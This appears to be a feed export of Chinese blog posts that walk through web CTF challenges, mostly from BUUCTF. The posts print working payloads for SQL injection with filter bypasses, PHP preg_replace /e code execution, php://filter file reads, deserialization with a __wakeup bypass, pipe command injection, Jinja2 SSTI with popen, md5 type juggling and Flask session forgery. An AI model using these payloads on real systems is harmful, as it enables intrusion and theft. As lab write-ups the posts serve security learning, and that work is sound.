<h2 id="bjdctf2020zjctf不过如此">[BJDCTF2020]ZJCTF，不过如此</h2>
<p>题目给出源码，和之前做的题有点相似</p>
<figure data-type="image" tabindex="43"><img src="https://z0ekball.github.io/post-images/image-20220415224438611.png" alt="image-20220415224438611" loading="lazy"></figure>
<p>第一个强比较使用<code>伪协议data://</code>绕过</p>
<pre><code>Playload:text= data://doc/;base64, SSBoYXZlIGEgZHJlYW0=
</code></pre>
<p>成功绕过</p>
<figure data-type="image" tabindex="44"><img src="https://z0ekball.github.io/post-images/image-20220415224508363.png" alt="image-20220415224508363" loading="lazy"></figure>
<p>后面的文件包含使用<code>伪协议php://filter</code>读取next.php</p>
<pre><code>Playload: file=php://filter/read=convert.base64-encode/resource=next.php
</code></pre>
<figure data-type="image" tabindex="45"><img src="https://z0ekball.github.io/post-images/image-20220415224530905.png" alt="image-20220415224530905" loading="lazy"></figure>
<p>Base64解码，得到代码</p>
<pre><code>&lt;?php

$id = $_GET['id'];

$_SESSION['id'] = $id;

function complex($re, $str) {

  return preg_replace( '/(' . $re . ')/ei','strtolower(&quot;\\1&quot;)',$str);}

foreach($_GET as $re =&gt; $str) {

  echo complex($re, $str). &quot;\n&quot;;}

function getFlag(){

  @eval($_GET['cmd']);}
</code></pre>
<p>在next.php文件中get传入id参数和cmd参数</p>
<p>preg_replace()以/e结尾时，存在<code>命令执行漏洞</code>，当存在/e则，匹配到符合正则表达式的字符串时，第二个参数的字符串将被当做代码执行</p>
<p>第二参数为<code>strtolower(&quot;\\1&quot;)</code>等价于<code>strtolower(&quot;\1&quot;)</code>，<code>\1</code>在正则表达式中指定第一个匹配项，整个函数的意思就是取出正则表达式匹配后子匹配表达式的第一项</p>
<p>foreach()函数把传进去的参数变为正则数值变为字符串</p>
<p>getFlag()返回cmd参数执行内容</p>
<p>构造</p>
<pre><code>playload: \S*=${getFlag()}&amp;cmd=system('cat /flag');
</code></pre>
<p>上传得到flag</p>
<figure data-type="image" tabindex="46"><img src="https://z0ekball.github.io/post-images/image-20220415224650366.png" alt="image-20220415224650366" loading="lazy"></figure>
<h2 id="ciscn2019-华北赛区-day2-web1hack-world">[CISCN2019 华北赛区 Day2 Web1]Hack World</h2>
<p>题目提示flag就在flag表flag列里</p>
<figure data-type="image" tabindex="47"><img src="https://z0ekball.github.io/post-images/image-20220415224702830.png" alt="image-20220415224702830" loading="lazy"></figure>
<p>Sql常规注入流程发现过滤了；、”、#、&amp;等字符，用（）绕过这些字符</p>
<p>直接查询id=(select(flag)from(flag))只返回错误信息</p>
<figure data-type="image" tabindex="48"><img src="https://z0ekball.github.io/post-images/image-20220415224721952.png" alt="image-20220415224721952" loading="lazy"></figure>
<p>Id=sleep(3)延时一段时间再返回说明注入成功，但只返回错误提示</p>
<p>猜测flag第一个字符为f即102，返回正确信息，所以是盲注</p>
<figure data-type="image" tabindex="49"><img src="https://z0ekball.github.io/post-images/image-20220415224730283.png" alt="image-20220415224730283" loading="lazy"></figure>
<p>脚本拿flag</p>
<figure data-type="image" tabindex="50"><img src="https://z0ekball.github.io/post-images/image-20220415224749548.png" alt="image-20220415224749548" loading="lazy"></figure>
<h2 id="swpu2019web1">[SWPU2019]Web1</h2>
<p>随便注册一个账号，登录之后有广告申请</p>
<figure data-type="image" tabindex="51"><img src="https://z0ekball.github.io/post-images/image-20220415224802040.png" alt="image-20220415224802040" loading="lazy"></figure>
<p>输入’，查询却显示错误，存在注入点</p>
<figure data-type="image" tabindex="52"><img src="https://z0ekball.github.io/post-images/image-20220415224831265.png" alt="image-20220415224814331" loading="lazy"></figure>
<p>经验证过滤了空格，or，and，--+，#，order等敏感字符，用/**/代替空格,group by代替order by</p>
<pre><code>-1'/**/group/**/by/**/21,'2，验证存在21个注入点

0'union/**/select/**/1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,'5，回显2,3，说明回显点在2，3
</code></pre>
<figure data-type="image" tabindex="53"><img src="https://z0ekball.github.io/post-images/image-20220415224849366.png" alt="image-20220415224849366" loading="lazy"></figure>
<pre><code>0'union/**/select/**/1,database(),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,'5查库
</code></pre>
<figure data-type="image" tabindex="54"><img src="https://z0ekball.github.io/post-images/image-20220415224932015.png" alt="image-20220415224932015" loading="lazy"></figure>
<pre><code>0'union/**/select/**/1,(select/**/group_concat(table_name)/**/from/**/mysql.innodb_table_stats),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,'5查表（information_schema.tables被过滤）
</code></pre>
<figure data-type="image" tabindex="55"><img src="https://z0ekball.github.io/post-images/image-20220415224940078.png" alt="image-20220415224940078" loading="lazy"></figure>
<pre><code>0'union/**/select/**/1,(select/**/group_concat(a)/**/from/**/(select/**/1,2,3/**/as/**/a/**/union/**/select/**/*/**/from/**/users)/**/as/**/b),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,'5,查列得到flag

</code></pre>
<figure data-type="image" tabindex="56"><img src="https://z0ekball.github.io/post-images/image-20220415224946140.png" alt="image-20220415224946140" loading="lazy"></figure>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[CTF刷题记录(三)]]></title>
        <id>https://z0ekball.github.io/post/ctf-shua-ti-ji-lu-san/</id>
        <link href="https://z0ekball.github.io/post/ctf-shua-ti-ji-lu-san/">
        </link>
        <updated>2022-02-02T12:06:52.000Z</updated>
        <content type="html"><![CDATA[<h2 id="极客大挑战-2019lovesql">[极客大挑战 2019]LoveSQL</h2>
<figure data-type="image" tabindex="1"><img src="https://z0ekball.github.io/post-images/image-20220415193955655.png" alt="image-20220415193955655" loading="lazy"></figure>
<p>都输入admin’ or 1=1 # ，回显<img src="https://z0ekball.github.io/post-images/image-20220415194017344.png" alt="image-20220415194017344" loading="lazy"></p>
<p>存在注入漏洞，抓包，进行注入</p>
<pre><code>admin' order by 3#有回显

admin' order by 4#回显错误，说明有3个注入点
</code></pre>
<figure data-type="image" tabindex="2"><img src="https://z0ekball.github.io/post-images/image-20220415194031190.png" alt="image-20220415194031190" loading="lazy"></figure>
<pre><code>1' union select 1,2,3 #确认回显位置可以是2,3
</code></pre>
<figure data-type="image" tabindex="3"><img src="https://z0ekball.github.io/post-images/image-20220415194034906.png" alt="image-20220415194034906" loading="lazy"></figure>
<pre><code>1' union select 1,2,database() #查库
</code></pre>
<figure data-type="image" tabindex="4"><img src="https://z0ekball.github.io/post-images/image-20220415194038326.png" alt="image-20220415194038326" loading="lazy"></figure>
<pre><code>1' union select 1,2,group_concat(table_name)from information_schema.tables where table_schema=database() #查表
</code></pre>
<figure data-type="image" tabindex="5"><img src="https://z0ekball.github.io/post-images/image-20220415194043672.png" alt="image-20220415194043672" loading="lazy"></figure>
<p>根据题目名提示，flag应该在第二个表，查列</p>
<pre><code>1' union select 1,2,group_concat(column_name)from information_schema.columns where table_schema=database() and table_name='l0ve1ysq1'#
</code></pre>
<figure data-type="image" tabindex="6"><img src="https://z0ekball.github.io/post-images/image-20220415194048692.png" alt="image-20220415194048692" loading="lazy"></figure>
<pre><code>查字段1' union select 1,2,group_concat(id,username,password)from l0ve1ysq1#得到flag
</code></pre>
<figure data-type="image" tabindex="7"><img src="https://z0ekball.github.io/post-images/image-20220415194053949.png" alt="image-20220415194053949" loading="lazy"></figure>
<figure data-type="image" tabindex="8"><img src="https://z0ekball.github.io/post-images/image-20220415194057980.png" alt="image-20220415194057980" loading="lazy"></figure>
<h2 id="网鼎杯-2020-青龙组areuserialz">[网鼎杯 2020 青龙组]AreUSerialz</h2>
<p>题目给出源码</p>
<figure data-type="image" tabindex="9"><img src="https://z0ekball.github.io/post-images/image-20220415194215695.png" alt="image-20220415194215695" loading="lazy"></figure>
<p>Get方式获取str参数，判断str里全是可打印字符（32-125），然后对str进行反序列化</p>
<p>查看所有函数，若要执行文件包含，则要执行read()函数，传入filename参数，并执行<code>file_get_contents</code>，回去文件内容</p>
<figure data-type="image" tabindex="10"><img src="https://z0ekball.github.io/post-images/image-20220415194231640.png" alt="image-20220415194231640" loading="lazy"></figure>
<p>要执行read()则要满足process()里的条件，令op=2</p>
<figure data-type="image" tabindex="11"><img src="https://z0ekball.github.io/post-images/image-20220415194247021.png" alt="image-20220415194247021" loading="lazy"></figure>
<p>要使执行process()函数且op=2则需要<code>构造filehandler类对象</code>，op赋值为2，filename传入文件包含的构造参数，执行构造函数则能执行process()</p>
<figure data-type="image" tabindex="12"><img src="https://z0ekball.github.io/post-images/image-20220415194308671.png" alt="image-20220415194308671" loading="lazy"></figure>
<p><code>整个流程</code>：</p>
<p>创造一个op=2,filename=”文件包含参数”的filehandler对象，执行构造函数中的process()，op=2则执行read()，read()传入filename并执行file_get_contents函数，读取文件内容</p>
<p>文件包含参数选择使用<code>伪协议读取</code></p>
<pre><code>filename=&quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;
</code></pre>
<p>构造playload</p>
<p>这里用到php7.1，对属性类型不敏感，public属性序列化不会出现不可见字符，可以直接采用public而不需要用到protected属性</p>
<p>若使用protected属性，则要在变量面前加上\00*\00，且用大写S表示为字符串</p>
<figure data-type="image" tabindex="13"><img src="https://z0ekball.github.io/post-images/image-20220415194400976.png" alt="image-20220415194400976" loading="lazy"></figure>
<figure data-type="image" tabindex="14"><img src="https://z0ekball.github.io/post-images/image-20220415194407442.png" alt="image-20220415194407442" loading="lazy"></figure>
<p>Get方式传入str参数，得到flag的base64编码，解码得flag</p>
<figure data-type="image" tabindex="15"><img src="https://z0ekball.github.io/post-images/image-20220415194415155.png" alt="image-20220415194415155" loading="lazy"></figure>
<figure data-type="image" tabindex="16"><img src="https://z0ekball.github.io/post-images/image-20220415194421129.png" alt="image-20220415194421129" loading="lazy"></figure>
<figure data-type="image" tabindex="17"><img src="https://z0ekball.github.io/post-images/image-20220415194425611.png" alt="image-20220415194425611" loading="lazy"></figure>
<h2 id="actf2020-新生赛exec">[ACTF2020 新生赛]Exec</h2>
<p>输入一个ip地址返回ping的结果，当输入|ls有回显，说明存在<code>管道符漏洞</code></p>
<figure data-type="image" tabindex="18"><img src="https://z0ekball.github.io/post-images/image-20220415194447458.png" alt="image-20220415194447458" loading="lazy"></figure>
<p>为防止重定向，抓包再直接输入<code>|cat /flag</code>（|直接执行后者语句），得到flag</p>
<figure data-type="image" tabindex="19"><img src="https://z0ekball.github.io/post-images/image-20220415194506939.png" alt="image-20220415194506939" loading="lazy"></figure>
<h2 id="极客大挑战-2019http">[极客大挑战 2019]Http</h2>
<p>查看源码发现隐藏的php</p>
<figure data-type="image" tabindex="20"><img src="https://z0ekball.github.io/post-images/image-20220415194519961.png" alt="image-20220415194519961" loading="lazy"></figure>
<p>进行访问，显示不是来自<code>“https://Sycsecret.buuoj.cn”</code>, 猜测是否要提供该条件才能获得flag</p>
<figure data-type="image" tabindex="21"><img src="https://z0ekball.github.io/post-images/image-20220415194548082.png" alt="image-20220415194548082" loading="lazy"></figure>
<p>抓包，请求头缺少<code>Referer</code></p>
<figure data-type="image" tabindex="22"><img src="https://z0ekball.github.io/post-images/image-20220415194603655.png" alt="image-20220415194603655" loading="lazy"></figure>
<p>补上<code>Referer:https://Sycsecret.buuoj.cn</code>后，显示没有使用给定浏览器</p>
<figure data-type="image" tabindex="23"><img src="https://z0ekball.github.io/post-images/image-20220415194618175.png" alt="image-20220415194618175" loading="lazy"></figure>
<p>改变<code>User-Agent：Syclover</code>，显示只能本地读取</p>
<figure data-type="image" tabindex="24"><img src="https://z0ekball.github.io/post-images/image-20220415194629075.png" alt="image-20220415194629075" loading="lazy"></figure>
<p>加上<code>X-Forwarded-For：127.0.0.1</code>确定请求端ip为本地，返回flag</p>
<figure data-type="image" tabindex="25"><img src="https://z0ekball.github.io/post-images/image-20220415194641407.png" alt="image-20220415194641407" loading="lazy"></figure>
<figure data-type="image" tabindex="26"><img src="https://z0ekball.github.io/post-images/image-20220415194645741.png" alt="image-20220415194645741" loading="lazy"></figure>
<h2 id="roarctf-2019easy-calc">[RoarCTF 2019]Easy Calc</h2>
<p>抓包，查看源码，存在waf，以及calc.php文件</p>
<figure data-type="image" tabindex="27"><img src="https://z0ekball.github.io/post-images/image-20220415194708312.png" alt="image-20220415194708312" loading="lazy"></figure>
<p>查看calc.php，看到对num的过滤函数</p>
<figure data-type="image" tabindex="28"><img src="https://z0ekball.github.io/post-images/image-20220415194717657.png" alt="image-20220415194717657" loading="lazy"></figure>
<h3 id="php字符串解析漏洞"><code>php字符串解析漏洞</code>:</h3>
<p><code>空格绕过</code>，当php解析url时，会将数据转化成数组格式，例如</p>
<pre><code>/?foo=bar变成Array([foo] =&gt; “bar”)
</code></pre>
<p>这个过程会删除一些字符或用下划线替代，例如</p>
<pre><code>/?%20news[id%00=42会转换为Array([news_id] =&gt; 42)
</code></pre>
<p>由于题目waf是对非数字值的拦截，则可以利用空格绕过,例如</p>
<pre><code>/?%20num=phpinfo()
</code></pre>
<p>经过waf检验时，由于空格，waf检验的变量为%20num而非num，但在php解析时空格会被去掉，即解析成num，绕过了检查。</p>
<figure data-type="image" tabindex="29"><img src="https://z0ekball.github.io/post-images/image-20220415194955271.png" alt="image-20220415194955271" loading="lazy"></figure>
<p>绕过成功，再使用<code>scandir函数</code>扫描dir目录，利用<code>var_dumo()函数</code>输出变量值</p>
<p>构造</p>
<pre><code>%20num=var_dump(scandir(/))
</code></pre>
<p>因为waf过滤‘/’，用chr(47)绕过</p>
<pre><code>%20num=var_dump(scandir(chr(47)))
</code></pre>
<p>找到f1agg目录</p>
<figure data-type="image" tabindex="30"><img src="https://z0ekball.github.io/post-images/image-20220415195052052.png" alt="image-20220415195052052" loading="lazy"></figure>
<p>再利用<code>file_get_contents()函数</code>读取文件，文件名/f1agg，同样使用chr绕过‘/’，得到flag</p>
<figure data-type="image" tabindex="31"><img src="https://z0ekball.github.io/post-images/image-20220415195107826.png" alt="image-20220415195107826" loading="lazy"></figure>
<h2 id="极客大挑战-2019php">[极客大挑战 2019]PHP</h2>
<p>提示有备份网站</p>
<figure data-type="image" tabindex="32"><img src="https://z0ekball.github.io/post-images/image-20220415195122690.png" alt="image-20220415195122690" loading="lazy"></figure>
<p>对网站进行扫描，发现备份网站</p>
<figure data-type="image" tabindex="33"><img src="https://z0ekball.github.io/post-images/image-20220415195130649.png" alt="image-20220415195130649" loading="lazy"></figure>
<p>访问备份网站下载文件包，打开文件，给了个假flag</p>
<figure data-type="image" tabindex="34"><img src="https://z0ekball.github.io/post-images/image-20220415195137557.png" alt="image-20220415195137557" loading="lazy"></figure>
<p>查看所有php文件，存在<code>反序列化漏洞</code></p>
<figure data-type="image" tabindex="35"><img src="https://z0ekball.github.io/post-images/image-20220415195146389.png" alt="image-20220415195146389" loading="lazy"></figure>
<figure data-type="image" tabindex="36"><img src="https://z0ekball.github.io/post-images/image-20220415195204229.png" alt="image-20220415195204229" loading="lazy"></figure>
<p>需要构造name类，使参数<code>username===admin</code>且<code>password==100</code>绕过解析函数第一个条件限制，同时还要绕过<code>wakeup函数</code></p>
<p>构造函数</p>
<figure data-type="image" tabindex="37"><img src="https://z0ekball.github.io/post-images/image-20220415195252295.png" alt="image-20220415195252295" loading="lazy"></figure>
<p>得到</p>
<pre><code>O:4:&quot;Name&quot;:2:{s:14:&quot;Nameusername&quot;;s:5:&quot;admin&quot;;s:14:&quot;Namepassword&quot;;s:3:&quot;100&quot;;}
</code></pre>
<p>改变参数个数绕过wakeup函数，由于参数是private属性，采用<code>%00</code>进行绕过</p>
<pre><code>playload: ?select=O:4:&quot;Name&quot;:3:{s:14:&quot;%00Name%00username&quot;;s:5:&quot;admin&quot;;s:14:&quot;%00Name%00password&quot;;s:3:&quot;100&quot;;}
</code></pre>
<p>得到falg</p>
<figure data-type="image" tabindex="38"><img src="https://z0ekball.github.io/post-images/image-20220415195340436.png" alt="image-20220415195340436" loading="lazy"></figure>
<h2 id="极客大挑战-2019babysql">[极客大挑战 2019]BabySQL</h2>
<p>抓包，进行简单测试，发现过滤了or，采用双写绕过</p>
<pre><code>username=admin'oorr('1'='1')#,password= admin'oorr 1&gt;1#
</code></pre>
<figure data-type="image" tabindex="39"><img src="https://z0ekball.github.io/post-images/image-20220415195359422.png" alt="image-20220415195359422" loading="lazy"></figure>
<pre><code>username=admin'oorrder bbyy 3#双写绕过order by
</code></pre>
<figure data-type="image" tabindex="40"><img src="https://z0ekball.github.io/post-images/image-20220415195403625.png" alt="image-20220415195403625" loading="lazy"></figure>
<pre><code>1'ununionion seselectlect 1,2,3#回显双写绕过union select
</code></pre>
<figure data-type="image" tabindex="41"><img src="https://z0ekball.github.io/post-images/image-20220415195600958.png" alt="image-20220415195600958" loading="lazy"></figure>
<pre><code>1'ununionion seselectlect 1,2,database()#暴库
</code></pre>
<figure data-type="image" tabindex="42"><img src="https://z0ekball.github.io/post-images/image-20220415195605228.png" alt="image-20220415195605228" loading="lazy"></figure>
<pre><code>1'ununionion seselectlect 1,2,group_concat(schema_name)frfromom(infoorrmation_schema.schemata)#双写绕过from和information，发现可以库
</code></pre>
<figure data-type="image" tabindex="43"><img src="https://z0ekball.github.io/post-images/image-20220415195611432.png" alt="image-20220415195611432" loading="lazy"></figure>
<pre><code>1'ununionion seselectlect 1,2,group_concat(table_name)frfromom(infoorrmation_schema.tables) whwhereere table_schema='ctf'#双写绕过where，查表
</code></pre>
<figure data-type="image" tabindex="44"><img src="https://z0ekball.github.io/post-images/image-20220415195615663.png" alt="image-20220415195615663" loading="lazy"></figure>
<pre><code>1'ununionion seselectlect 1,2,group_concat(column_name)frfromom(infoorrmation_schema.columns) whwhereere table_name='Flag'#查列
</code></pre>
<pre><code>1'ununionion seselectlect 1,2,group_concat(flag)frfromom(ctf.Flag)#查字段
</code></pre>
<figure data-type="image" tabindex="45"><img src="https://z0ekball.github.io/post-images/image-20220415195632681.png" alt="image-20220415195632681" loading="lazy"></figure>
<h2 id="护网杯-2018easy_tornado">[护网杯 2018]easy_tornado</h2>
<p>题目给了三个提示，分别是<code>flag in /fllllllllllllag</code>,<code>render</code>,<code>md5(cookie_secret+md5(filename))</code></p>
<p>分别提示flag所在文件，模板注入，以及filehash计算公式</p>
<p>需要获取cookie_secret值，由于render函数配合tornado使用，在tornado模板中可以快速访问某些对象，通过handler.settings参数，我们可以获得一些环境变量，其中就包含cookie_secret</p>
<p>输入错误的路径参数，返回一个错误页面，存在get传参，也就是模板注入的参数</p>
<figure data-type="image" tabindex="46"><img src="https://z0ekball.github.io/post-images/image-20220415195733520.png" alt="image-20220415195733520" loading="lazy"></figure>
<p>模板注入请求handler.settings参数，返回cookie_secret</p>
<figure data-type="image" tabindex="47"><img src="https://z0ekball.github.io/post-images/image-20220415195742513.png" alt="image-20220415195742513" loading="lazy"></figure>
<p>通过脚本利用公式获得filehash值</p>
<figure data-type="image" tabindex="48"><img src="https://z0ekball.github.io/post-images/image-20220415195753354.png" alt="image-20220415195753354" loading="lazy"></figure>
<pre><code>file?filename=/fllllllllllllag&amp;filehash=af86ca897d78fd6eb99b3cbe61eb3731
</code></pre>
<p>得到flag</p>
<figure data-type="image" tabindex="49"><img src="https://z0ekball.github.io/post-images/image-20220415195824324.png" alt="image-20220415195824324" loading="lazy"></figure>
<h2 id="hctf-2018admin">[HCTF 2018]admin</h2>
<p>源码提示不是admin，猜测要登录admin账号才能获得flag</p>
<figure data-type="image" tabindex="50"><img src="https://z0ekball.github.io/post-images/image-20220415195837552.png" alt="image-20220415195837552" loading="lazy"></figure>
<p>随便注册一个账号后登录，在改密码页面发现题目源码地址</p>
<figure data-type="image" tabindex="51"><img src="https://z0ekball.github.io/post-images/image-20220415195844737.png" alt="image-20220415195844737" loading="lazy"></figure>
<p>抓包，POST方式上传参数，cookie里有session参数，可以通过<code>伪造session参数</code>欺骗后台系统</p>
<figure data-type="image" tabindex="52"><img src="https://z0ekball.github.io/post-images/image-20220415195854297.png" alt="image-20220415195854297" loading="lazy"></figure>
<p>下载源码后，在config.py找到secret_key值用于构造session</p>
<figure data-type="image" tabindex="53"><img src="https://z0ekball.github.io/post-images/image-20220415195916702.png" alt="image-20220415195916702" loading="lazy"></figure>
<p>通过<code>flask-session-cookie-manager-master</code>工具解密当前session</p>
<figure data-type="image" tabindex="54"><img src="https://z0ekball.github.io/post-images/image-20220415195927081.png" alt="image-20220415195927081" loading="lazy"></figure>
<p>再用工具构造name:admin</p>
<figure data-type="image" tabindex="55"><img src="https://z0ekball.github.io/post-images/image-20220415195933672.png" alt="image-20220415195933672" loading="lazy"></figure>
<p>修改session，上传得flag</p>
<figure data-type="image" tabindex="56"><img src="https://z0ekball.github.io/post-images/image-20220415195944224.png" alt="image-20220415195944224" loading="lazy"></figure>
<h2 id="bjdctf2020easy-md5">[BJDCTF2020]Easy MD5</h2>
<p>抓包发现响应包消息头有提示</p>
<figure data-type="image" tabindex="57"><img src="https://z0ekball.github.io/post-images/image-20220415195958451.png" alt="image-20220415195958451" loading="lazy"></figure>
<h3 id="php中的md5stringraw"><code>php中的md5(string,raw)</code></h3>
<pre><code>String:：必需。规定要计算的字符串。

Raw: 可选。规定十六进制或二进制输出格式：

TRUE - 原始 16 字符二进制格式

FALSE - 默认。32 字符十六进制数
</code></pre>
<p>则题中的md5函数意思是计算$pass输出16字符二进制格式</p>
<p>我们可以通过构造$pass生成一个可执行语句嵌入sql语句当中，使之执行。据网上的资料</p>
<pre><code>ffifdyop通过上述函数运算后得出的结果是'or'6\xc9]\x99\xe9!r,\xf9\xedb\x1c对应字符串为'or'6�]��!r,��b，当password=’md5(‘ffifdyop’,true)’时得到的结果是，password=’ 'or'6�]��!r,��b’
</code></pre>
<p>在mysql中，布尔判断时会把1开头的字符串当做整型数，当字符串被双单引号括起来的时候是有效的</p>
<pre><code>即'6�]��!r,��b’在布尔判断时会被当成整型数，则整个语句相当于password=’’or true，即判断为真，成为了万能密码
</code></pre>
<p>当提交ffifdyop后，密码判断通过，跳转至另一个界面</p>
<figure data-type="image" tabindex="58"><img src="https://z0ekball.github.io/post-images/image-20220415200255186.png" alt="image-20220415200255186" loading="lazy"></figure>
<p>源码里给出提示，这里get传参a和b，判断a,b不相同，且<code>md5($a)==md5($d)</code></p>
<figure data-type="image" tabindex="59"><img src="https://z0ekball.github.io/post-images/image-20220415200312013.png" alt="image-20220415200312013" loading="lazy"></figure>
<pre><code>在php语言中==比较会把字符串转化成相同的类型再进行比较，当数值与字符串进行比较时，会将字符串转化成数值。当&quot;0e123456&quot;==&quot;0e456789&quot;进行比较时，0e字符串会被识别成科学计数法数字，0的多少次方都为0，故判断两字符串相等
</code></pre>
<p>故要<code>绕过MD5比较</code>，寻找两个能生成0e+数字的字符串即可判断为相等</p>
<figure data-type="image" tabindex="60"><img src="https://z0ekball.github.io/post-images/image-20220415200409399.png" alt="image-20220415200341536" loading="lazy"></figure>
<pre><code>传参a= s214587387a,b= s878926199a
</code></pre>
<figure data-type="image" tabindex="61"><img src="https://z0ekball.github.io/post-images/image-20220415200422964.png" alt="image-20220415200422964" loading="lazy"></figure>
<p>跳转页面</p>
<figure data-type="image" tabindex="62"><img src="https://z0ekball.github.io/post-images/image-20220415200442865.png" alt="image-20220415200442865" loading="lazy"></figure>
<p>给出的源码，因为post传参数param1和param2两值不相等，且md5值===强比较相等</p>
<p>强比较难以绕过，但是可以通过<code>md5错误返回值</code>进行判断，即上传一个md5函数不能处理的值，如数组，则md5将返回false，当两边都返回false时，判断位相等</p>
<p>同样，上面的弱比较使用传数组的方法也能通过验证</p>
<figure data-type="image" tabindex="63"><img src="https://z0ekball.github.io/post-images/image-20220415200617118.png" alt="image-20220415200617118" loading="lazy"></figure>
<p>返回新页面，成功绕过弱比较</p>
<p>在强比较中，post方法传参param1[]=1&amp;param2[]=2得到flag</p>
<figure data-type="image" tabindex="64"><img src="https://z0ekball.github.io/post-images/image-20220415200640472.png" alt="image-20220415200640472" loading="lazy"></figure>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[CTF刷题记录(二)]]></title>
        <id>https://z0ekball.github.io/post/ctf-shua-ti-ji-lu-er/</id>
        <link href="https://z0ekball.github.io/post/ctf-shua-ti-ji-lu-er/">
        </link>
        <updated>2022-01-10T11:22:08.000Z</updated>
        <content type="html"><![CDATA[<h2 id="第三章-web进阶ssti">[第三章 web进阶]SSTI</h2>
<p>输入正常数字回显数字</p>
<p>​                          <img src="https://z0ekball.github.io/post-images/image-20220415184319900.png" alt="image-20220415184319900" loading="lazy"></p>
<p>输入运算语句回显结果，说明后台解析注入语句，了存在<code>ssti模板注入</code>漏洞</p>
<figure data-type="image" tabindex="1"><img src="https://z0ekball.github.io/post-images/image-20220415184426777.png" alt="image-20220415184328517" loading="lazy"></figure>
<h3 id="ssti服务端模板注入"><code>ssti服务端模板注入</code>：</h3>
<p>拿到数据，塞到模板里，然后让渲染引擎将赛进去的东西生成 html 的文本，返回给浏览器，这样做的好处展示数据快，大大提升效率。</p>
<p>漏洞原理:能够解析执行语句，因此能够写入命令行</p>
<pre><code>password={{&quot;&quot;.__class__.__bases__[0].__subclasses__()}}找可用于执行os命令的类os._wrap_close
</code></pre>
<figure data-type="image" tabindex="2"><img src="https://z0ekball.github.io/post-images/image-20220415184459378.png" alt="image-20220415184459378" loading="lazy"></figure>
<p>os.<em>wrap_close在subclasses</em>_()中是第127个函数</p>
<p>故构造</p>
<pre><code>password={{&quot;&quot;.__class__.__bases__[0].__subclasses__()[127]}}，找到os._wrap_close
</code></pre>
<figure data-type="image" tabindex="3"><img src="https://z0ekball.github.io/post-images/image-20220415184535002.png" alt="image-20220415184535002" loading="lazy"></figure>
<p>再通过构造</p>
<pre><code>password={{&quot;&quot;.__class__.__bases__[0].__subclasses__()[127].__init__.__globals__['popen']('ls').read()}}执行ls命令，查看目录
</code></pre>
<figure data-type="image" tabindex="4"><img src="https://z0ekball.github.io/post-images/image-20220415184602056.png" alt="image-20220415184602056" loading="lazy"></figure>
<p>再构造</p>
<pre><code>password={{&quot;&quot;.__class__.__bases__[0].__subclasses__()[127].__init__.__globals__['popen']('ls -F /app/').read()}}读取app目录下的文件，找到server.py
</code></pre>
<figure data-type="image" tabindex="5"><img src="https://z0ekball.github.io/post-images/image-20220415184620383.png" alt="image-20220415184620383" loading="lazy"></figure>
<p>再构造：</p>
<pre><code>password={{&quot;&quot;.__class__.__bases__[0].__subclasses__()[127].__init__.__globals__['popen']('cat /app/server.py').read()}}获取整个server.py
</code></pre>
<p>抓包在burpsuite里更容易看，找到了flag</p>
<figure data-type="image" tabindex="6"><img src="https://z0ekball.github.io/post-images/image-20220415184650597.png" alt="image-20220415184650597" loading="lazy"></figure>
<h2 id="第三章-web进阶逻辑漏洞">[第三章 web进阶]逻辑漏洞</h2>
<p>用户名：admin密码：admin登录进去之后，有商品，可以购买flag</p>
<figure data-type="image" tabindex="7"><img src="https://z0ekball.github.io/post-images/image-20220415184719331.png" alt="image-20220415184719331" loading="lazy"></figure>
<p>点击购买，不够钱</p>
<figure data-type="image" tabindex="8"><img src="https://z0ekball.github.io/post-images/image-20220415184726084.png" alt="image-20220415184726084" loading="lazy"></figure>
<p>购买别的商品，花费300</p>
<figure data-type="image" tabindex="9"><img src="https://z0ekball.github.io/post-images/image-20220415185202087.png" alt="image-20220415185202087" loading="lazy"></figure>
<p>购买多次之后，钱不够了，说明后台在计算剩余钱数</p>
<figure data-type="image" tabindex="10"><img src="https://z0ekball.github.io/post-images/image-20220415185210458.png" alt="image-20220415185210458" loading="lazy"></figure>
<p>推测计算公式为<code>总数-cost</code>，所以我们可以反向购买，使之变成<code>总数-（-cost）=总数+cost</code>，增加余额，达到需要的钱数</p>
<pre><code>?cost=-300&amp;goods=3

重复多次就空手套白狼，赚够钱了
</code></pre>
<figure data-type="image" tabindex="11"><img src="https://z0ekball.github.io/post-images/image-20220415185244119.png" alt="image-20220415185244119" loading="lazy"></figure>
<h2 id="linux-labs">Linux Labs</h2>
<figure data-type="image" tabindex="12"><img src="https://z0ekball.github.io/post-images/image-20220415185340992.png" alt="image-20220415185340992" loading="lazy"></figure>
<p>连接靶机，在目录下找到flag</p>
<figure data-type="image" tabindex="13"><img src="https://z0ekball.github.io/post-images/image-20220415185350167.png" alt="image-20220415185350167" loading="lazy"></figure>
<h2 id="gxyctf2019babysqli">[GXYCTF2019]BabySQli</h2>
<p>源码给出了提示，base32解码后base64解码得到查询的sql语句</p>
<figure data-type="image" tabindex="14"><img src="https://z0ekball.github.io/post-images/image-20220415185406294.png" alt="image-20220415185406294" loading="lazy"></figure>
<figure data-type="image" tabindex="15"><img src="https://z0ekball.github.io/post-images/image-20220415185413070.png" alt="image-20220415185413070" loading="lazy"></figure>
<p>根据语句构造playload：1’#回显  <img src="https://z0ekball.github.io/post-images/image-20220415185433907.png" alt="image-20220415185433907" loading="lazy"></p>
<p>说明存在注入漏洞</p>
<p>再构造1'oR 1&gt;0#回显<img src="https://z0ekball.github.io/post-images/image-20220415185448715.png" alt="image-20220415185448715" loading="lazy"></p>
<p>admin ' ORder by 3#回显<img src="https://z0ekball.github.io/post-images/image-20220415185455748.png" alt="image-20220415185455748" loading="lazy"></p>
<p>admin' oRder by 4#回显<img src="https://z0ekball.github.io/post-images/image-20220415185503532.png" alt="image-20220415185503532" loading="lazy"></p>
<p>说明存在3个注入点，使用联合注入admin'UnION select 1,2,3#回显<img src="https://z0ekball.github.io/post-images/image-20220415185523801.png" alt="image-20220415185523801" loading="lazy"></p>
<p>name=admin'union select 1,'admin',3#&amp;pw=1回显<img src="https://z0ekball.github.io/post-images/image-20220415185534180.png" alt="image-20220415185534180" loading="lazy"></p>
<p>说明2注入点为用户名</p>
<h3 id="联合注入添加临时虚拟用户"><code>联合注入添加临时虚拟用户</code>：</h3>
